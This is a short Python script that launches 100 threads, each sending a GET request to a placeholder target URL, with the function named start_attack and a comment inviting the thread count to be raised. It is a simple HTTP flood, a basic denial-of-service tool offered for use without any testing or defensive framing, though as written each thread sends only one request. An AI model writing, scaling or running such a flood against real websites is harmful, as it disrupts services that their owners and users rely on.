import requests
import threading

target_url = 'http://example.com'

def send_request():
    try:
        response = requests.get(target_url)
        print(f'Status Code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')
def start_attack(threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_request)
        thread_list.append(thread)
        thread.start()
    for thread in thread_list:
        thread.join()
if __name__ == '__main__':
    number_of_threads = 100  # Adjust as needed
    start_attack(number_of_threads)
